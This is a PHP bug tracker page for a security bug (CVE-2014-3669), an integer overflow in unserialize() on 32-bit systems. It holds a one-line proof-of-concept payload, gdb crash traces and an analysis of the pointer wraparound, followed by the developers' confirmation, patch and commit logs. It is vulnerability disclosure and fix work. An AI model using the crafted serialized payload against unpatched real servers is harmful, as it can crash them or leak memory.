<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='Reproducible crash Bug #68044 - RDF' href='rss/bug.php?id=68044'>
        <link rel='alternate' type='application/rss+xml' title='Reproducible crash Bug #68044 - RSS 2.0' href='rss/bug.php?id=68044&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #68044 :: Integer overflow in unserialize() (32-bits only)</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=68044">Sec Bug</a>&nbsp;#68044</th>
            <td id="summary" colspan="5">Integer overflow in unserialize() (32-bits only)</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2014-09-18 13:55 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2014-10-14 17:41 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>symeon &#x64;&#111;&#x74; paraschoudis &#x61;&#116; htbridge &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td></td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=Reproducible+crash">Reproducible crash</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.5.17</td>
            <th class="details">OS:</th>
            <td>Ubuntu 14.04.1 LTS 32bit</td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3669" target="_blank">2014-3669</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=68044&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=68044&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=68044&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1411048516">&nbsp;</a><strong>[2014-09-18 13:55 UTC] symeon &#x64;&#111;&#x74; paraschoudis &#x61;&#116; htbridge &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
PoC
======================================
&lt;?php
unserialize('C:3:&quot;GMP&quot;:18446744075857035259:{}');
?&gt;

Result
======================================
gdb$ r poc.php 
Starting program: /home/user/Desktop/php-5.5.17/sapi/cli/php poc.php
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/i386-linux-gnu/libthread_db.so.1&quot;.

Warning: Class __PHP_Incomplete_Class has no unserializer in /home/user/Desktop/poc.php on line 2

Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
  EAX: 0x3510DAB3  EBX: 0xB510C74C  ECX: 0x3510DAB4  EDX: 0xBFFFBA88  o d I t s z A p C 
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFB918  ESP: 0xBFFFB918  EIP: 0x0850505F
  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------[code]
=&gt; 0x850505f &lt;finish_nested_data+16&gt;: movzx  eax,BYTE PTR [eax]
   0x8505062 &lt;finish_nested_data+19&gt;: cmp    al,0x7d
                        .... snip ....
--------------------------------------------------------------------------------
0x0850505f in finish_nested_data (rval=0xbfffbab4, p=0xbfffba88, max=0xb510dab9 &quot;&quot;, var_hash=0xbfffba84, tsrm_ls=0x8c81338) at /home/user/Desktop/php-5.5.17/ext/standard/var_unserializer.c:356
356   if (*((*p)++) == '}')

gdb$ bt
#0  0x0850505f in finish_nested_data (rval=0xbfffbab4, p=0xbfffba88, max=0xb510dab9 &quot;&quot;, var_hash=0xbfffba84, tsrm_ls=0x8c81338) at /home/user/Desktop/php-5.5.17/ext/standard/var_unserializer.c:356
#1  0x085051bb in object_custom (rval=0xbfffbab4, p=0xbfffba88, max=0xb510dab9 &quot;&quot;, var_hash=0xbfffba84, tsrm_ls=0x8c81338, ce=0x8da10d0) at /home/user/Desktop/php-5.5.17/ext/standard/var_unserializer.c:387
#2  0x085062cb in php_var_unserialize (rval=0xbfffbab4, p=0xbfffba88, max=0xb510dab9 &quot;&quot;, var_hash=0xbfffba84, tsrm_ls=0x8c81338) at /home/user/Desktop/php-5.5.17/ext/standard/var_unserializer.c:738
#3  0x084f264a in zif_unserialize (ht=0x1, return_value=0xb510c74c, return_value_ptr=0x0, this_ptr=0x0, return_value_used=0x0, tsrm_ls=0x8c81338) at /home/user/Desktop/php-5.5.17/ext/standard/var.c:965
#4  0x0862eeda in zend_do_fcall_common_helper_SPEC (execute_data=0xb50ef08c, tsrm_ls=0x8c81338) at /home/user/Desktop/php-5.5.17/Zend/zend_vm_execute.h:550
#5  0x08633b66 in ZEND_DO_FCALL_SPEC_CONST_HANDLER (execute_data=0xb50ef08c, tsrm_ls=0x8c81338) at /home/user/Desktop/php-5.5.17/Zend/zend_vm_execute.h:2332
#6  0x0862e411 in execute_ex (execute_data=0xb50ef08c, tsrm_ls=0x8c81338) at /home/user/Desktop/php-5.5.17/Zend/zend_vm_execute.h:363
#7  0x0862e4cf in zend_execute (op_array=0xb510cff0, tsrm_ls=0x8c81338) at /home/user/Desktop/php-5.5.17/Zend/zend_vm_execute.h:388
#8  0x085f1f1d in zend_execute_scripts (type=0x8, tsrm_ls=0x8c81338, retval=0x0, file_count=0x3) at /home/user/Desktop/php-5.5.17/Zend/zend.c:1330
#9  0x08556b7e in php_execute_script (primary_file=0xbfffeee4, tsrm_ls=0x8c81338) at /home/user/Desktop/php-5.5.17/main/main.c:2506
#10 0x0869dee7 in do_cli (argc=0x2, argv=0x8c812a0, tsrm_ls=0x8c81338) at /home/user/Desktop/php-5.5.17/sapi/cli/php_cli.c:994
#11 0x0869f279 in main (argc=0x2, argv=0x8c812a0) at /home/user/Desktop/php-5.5.17/sapi/cli/php_cli.c:1378



Analysis
=============================== 32bit case ============================

File var_unserializer.c, line 365:

static inline int object_custom(UNSERIALIZE_PARAMETER, zend_class_entry *ce)
{
    long datalen;

    datalen = parse_iv2((*p) + 2, p);

    (*p) += 2;

    if (datalen &lt; 0 || (*p) + datalen &gt;= max) {
        zend_error(E_WARNING, &quot;Insufficient data for unserializing - %ld required, %ld present&quot;, datalen, (long)(max - (*p)));
        return 0;
    }
    ... snip ...

    (*p) += datalen;

    return finish_nested_data(UNSERIALIZE_PASSTHRU);
}

Initially we set a breakpoint at the previous if statement and examine the values.

Breakpoint 1, object_custom (rval=0xbfffbab4, p=0xbfffba88, max=0xb510dab9 &quot;&quot;, var_hash=0xbfffba84, tsrm_ls=0x8c81338, ce=0x8da10d0) at /home/user/Desktop/php-5.5.17/ext/standard/var_unserializer.c:373
373   if (datalen &lt; 0 || (*p) + datalen &gt;= max) {


gdb$ ptype datalen
type = long
gdb$ print sizeof(datalen)
$1 = 0x4
gdb$ print datalen
$2 = 0x7ffffffb
gdb$ p/d datalen
$3 = 2147483643 &lt;-- Decimal value of datalen
gdb$ p/x datalen + 5
$4 = 0x80000000
gdb$ p/d datalen + 5
$5 = -2147483648 &lt;-- overflow on 32bits systems


The addition of datalen with any value greater or equal to 5 will overflow the integer.
This is due to the fact that the size of a long is the same as an integer.

Let's examine the current decimal max, (*p) and (*p) + datalen values:

gdb$ p/d max
$6 = 3037780665

gdb$ p/d (*p)
$7 = 3037780664 &lt;-- Less than max but big enough to overflow datalen

gdb$ p/d (*p) + datalen
$8 = 890297011 &lt;-- overflown value

gdb$ p/x (*p) + datalen
$9 = 0x3510dab3

Consequently, 890297011 is indeed less than max (3037780665) which means that the 
above if statement is false. We continue the execution and we end up here:

Breakpoint 2, object_custom (rval=0xbfffbab4, p=0xbfffba88, max=0xb510dab9 &quot;&quot;, var_hash=0xbfffba84, tsrm_ls=0x8c81338, ce=0x8da10d0) at /home/user/Desktop/php-5.5.17/ext/standard/var_unserializer.c:385
385   (*p) += datalen;

gdb$ step
--------------------------------------------------------------------------[regs]
  EAX: 0xBFFFBA88  EBX: 0xB510C74C  ECX: 0xBFFFB8C8  EDX: 0x3510DAB3  o d I t s z A p C 
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFB958  ESP: 0xBFFFB920  EIP: 0x08505194
  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------[code]
=&gt; 0x8505194 &lt;object_custom+288&gt;: mov    eax,DWORD PTR [ebp+0x18]
   0x8505197 &lt;object_custom+291&gt;: mov    DWORD PTR [esp+0x10],eax
   ... snip ...
   ... snip ...
--------------------------------------------------------------------------------
387   return finish_nested_data(UNSERIALIZE_PASSTHRU);


gdb$ print *p
$10 = (const unsigned char *) 0x3510dab3 &lt;error: Cannot access memory at address 0x3510dab3&gt;

As expected *p pointer now points to invalid memory address and continuing the execution
we are going to dereference this address and eventually crash.

gdb$ c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
  EAX: 0x3510DAB3  EBX: 0xB510C74C  ECX: 0x3510DAB4  EDX: 0xBFFFBA88  o d I t s z A p C 
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFB918  ESP: 0xBFFFB918  EIP: 0x0850505F
  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
--------------------------------------------------------------------------[code]
=&gt; 0x850505f &lt;finish_nested_data+16&gt;: movzx  eax,BYTE PTR [eax]
   0x8505062 &lt;finish_nested_data+19&gt;: cmp    al,0x7d
   ... snip ....
   0x8505073 &lt;finish_nested_data+36&gt;: ret    
--------------------------------------------------------------------------------
0x0850505f in finish_nested_data (rval=0xbfffbab4, p=0xbfffba88, max=0xb510dab9 &quot;&quot;, var_hash=0xbfffba84, tsrm_ls=0x8c81338) at /home/user/Desktop/php-5.5.17/ext/standard/var_unserializer.c:356
356   if (*((*p)++) == '}')


=============================== 64bit case ============================


Breakpoint 1, object_custom (rval=0x7fffffffaa30, p=0x7fffffffaa50, max=0x7ffff1268bf1 &quot;&quot;, var_hash=0x7fffffffaa48, ce=0x154b7f0) at /home/symeon/Desktop/php-5.5.17/ext/standard/var_unserializer.c:373
373        if (datalen &lt; 0 || (*p) + datalen &gt;= max) {

gdb$ print sizeof(datalen)
$1 = 0x8
gdb$ print datalen
$2 = 0x7ffffffb
gdb$ p/d datalen
$3 = 2147483643
gdb$ p/x datalen + 5
$4 = 0x80000000
gdb$ p/d datalen + 5
$5 = 2147483648 &lt;--- No overflow
gdb$ p/d max
$6 = 140737239223281
gdb$ p/d (*p) + datalen
$7 = 140739386706923

On a 64-bit machine the sum of (*p) + datalen is calculated correctly and as 140739386706923 is greater
than max (140737239223281) we jump into the if statement and get this warning:

gdb$ c

Warning: Insufficient data for unserializing - 2147483643 required, 1 present in /home/symeon/Desktop/poc.php on line 2

[Inferior 1 (process 8693) exited normally]



</pre>
</div><h2>Patches</h2>
<a href="patch-display.php?bug_id=68044&amp;patch=overflow-fix&amp;revision=latest" >overflow-fix</a>
(last revision 2014-09-28 21:26 UTC by stas@php.net)
<br><p><a href='patch-add.php?bug_id=68044'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=68044'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_comment' ><a name="1411630878">&nbsp;</a><strong>[2014-09-25 07:41 UTC] symeon &#x64;&#111;&#x74; paraschoudis &#x61;&#116; htbridge &#x64;&#111;&#x74; com</strong>
<pre class='note'>Would anyone care to review and confirm it?
Also after spending some time it looks like this is a read access violation so I am changing the bug type.
</pre>
</div><div class='comment type_comment' ><a name="1411938454">&nbsp;</a><strong>[2014-09-28 21:07 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Looks like a real bug. May be hard to reproduce since it requires the p pointer to be high enough to wrap around (couldn't make it that way on Mac, for example). The patch will follow shortly. Also probably needs a CVE since serializer can be exposed to user-controlled data and this can trigger at least crash, theoretically info disclosure,
</pre>
</div><div class='comment type_patch' ><a name="1411939560">&nbsp;</a><strong>[2014-09-28 21:26 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The following patch has been added/updated:

Patch Name: overflow-fix
Revision:   1411939560
URL:        <a href="https://bugs.php.net/patch-display.php?bug=68044&amp;patch=overflow-fix&amp;revision=1411939560" rel="nofollow">https://bugs.php.net/patch-display.php?bug=68044&amp;patch=overflow-fix&amp;revision=1411939560</a>
</pre>
</div><div class='comment type_log' ><a name="1411968838">&nbsp;</a><strong>[2014-09-29 05:33 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: 2014-3669</span>
</div></div></div><div class='comment type_svn' ><a name="1413308530">&nbsp;</a><strong>[2014-10-14 17:42 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=56754a7f9eba0e4f559b6ca081d9f2a447b3f159" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=56754a7f9eba0e4f559b6ca081d9f2a447b3f159</a>
Log: Fixed <a href='bug.php?id=68044'>bug #68044</a>: Integer overflow in unserialize() (32-bits only)
</pre>
</div><div class='comment type_log' ><a name="1413308531">&nbsp;</a><strong>[2014-10-14 17:42 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Open</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_svn' ><a name="1413308668">&nbsp;</a><strong>[2014-10-14 17:44 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=9aa90145239bae82d2af0a99fdae4ab27eb5f4f2" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=9aa90145239bae82d2af0a99fdae4ab27eb5f4f2</a>
Log: Fixed <a href='bug.php?id=68044'>bug #68044</a>: Integer overflow in unserialize() (32-bits only)
</pre>
</div><div class='comment type_svn' ><a name="1413308759">&nbsp;</a><strong>[2014-10-14 17:45 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=88eb7ea47dd6d23378b116aa76428ef4907c5373" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=88eb7ea47dd6d23378b116aa76428ef4907c5373</a>
Log: Fixed <a href='bug.php?id=68044'>bug #68044</a>: Integer overflow in unserialize() (32-bits only)
</pre>
</div><div class='comment type_svn' ><a name="1413308765">&nbsp;</a><strong>[2014-10-14 17:46 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=9aa90145239bae82d2af0a99fdae4ab27eb5f4f2" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=9aa90145239bae82d2af0a99fdae4ab27eb5f4f2</a>
Log: Fixed <a href='bug.php?id=68044'>bug #68044</a>: Integer overflow in unserialize() (32-bits only)
</pre>
</div><div class='comment type_svn' ><a name="1413309205">&nbsp;</a><strong>[2014-10-14 17:53 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=3eb679b952f4655f178cf576584ef172602325ab" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=3eb679b952f4655f178cf576584ef172602325ab</a>
Log: Fixed <a href='bug.php?id=68044'>bug #68044</a>: Integer overflow in unserialize() (32-bits only)
</pre>
</div><div class='comment type_svn' ><a name="1413309211">&nbsp;</a><strong>[2014-10-14 17:53 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=88eb7ea47dd6d23378b116aa76428ef4907c5373" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=88eb7ea47dd6d23378b116aa76428ef4907c5373</a>
Log: Fixed <a href='bug.php?id=68044'>bug #68044</a>: Integer overflow in unserialize() (32-bits only)
</pre>
</div><div class='comment type_svn' ><a name="1413309217">&nbsp;</a><strong>[2014-10-14 17:53 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=9aa90145239bae82d2af0a99fdae4ab27eb5f4f2" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=9aa90145239bae82d2af0a99fdae4ab27eb5f4f2</a>
Log: Fixed <a href='bug.php?id=68044'>bug #68044</a>: Integer overflow in unserialize() (32-bits only)
</pre>
</div><div class='comment type_svn' ><a name="1413367856">&nbsp;</a><strong>[2014-10-15 10:10 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=3eb679b952f4655f178cf576584ef172602325ab" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=3eb679b952f4655f178cf576584ef172602325ab</a>
Log: Fixed <a href='bug.php?id=68044'>bug #68044</a>: Integer overflow in unserialize() (32-bits only)
</pre>
</div><div class='comment type_svn' ><a name="1413367862">&nbsp;</a><strong>[2014-10-15 10:11 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=88eb7ea47dd6d23378b116aa76428ef4907c5373" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=88eb7ea47dd6d23378b116aa76428ef4907c5373</a>
Log: Fixed <a href='bug.php?id=68044'>bug #68044</a>: Integer overflow in unserialize() (32-bits only)
</pre>
</div><div class='comment type_svn' ><a name="1413367868">&nbsp;</a><strong>[2014-10-15 10:11 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=9aa90145239bae82d2af0a99fdae4ab27eb5f4f2" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=9aa90145239bae82d2af0a99fdae4ab27eb5f4f2</a>
Log: Fixed <a href='bug.php?id=68044'>bug #68044</a>: Integer overflow in unserialize() (32-bits only)
</pre>
</div><div class='comment type_svn' ><a name="1413374895">&nbsp;</a><strong>[2014-10-15 12:08 UTC] <a href="//people.php.net/jpauli">jpauli@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=4af06aca40ac4c592a71a0b1206a50fad994de21" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=4af06aca40ac4c592a71a0b1206a50fad994de21</a>
Log: Fixed <a href='bug.php?id=68044'>bug #68044</a>: Integer overflow in unserialize() (32-bits only)
</pre>
</div><div class='comment type_svn' ><a name="1415043636">&nbsp;</a><strong>[2014-11-03 19:40 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=56754a7f9eba0e4f559b6ca081d9f2a447b3f159" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=56754a7f9eba0e4f559b6ca081d9f2a447b3f159</a>
Log: Fixed <a href='bug.php?id=68044'>bug #68044</a>: Integer overflow in unserialize() (32-bits only)
</pre>
</div><div class='comment type_svn' ><a name="1416342905">&nbsp;</a><strong>[2014-11-18 20:35 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=56754a7f9eba0e4f559b6ca081d9f2a447b3f159" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=56754a7f9eba0e4f559b6ca081d9f2a447b3f159</a>
Log: Fixed <a href='bug.php?id=68044'>bug #68044</a>: Integer overflow in unserialize() (32-bits only)
</pre>
</div><div class='comment type_svn' ><a name="1469014830">&nbsp;</a><strong>[2016-07-20 11:40 UTC] <a href="//people.php.net/davey">davey@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=3eb679b952f4655f178cf576584ef172602325ab" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=3eb679b952f4655f178cf576584ef172602325ab</a>
Log: Fixed <a href='bug.php?id=68044'>bug #68044</a>: Integer overflow in unserialize() (32-bits only)
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
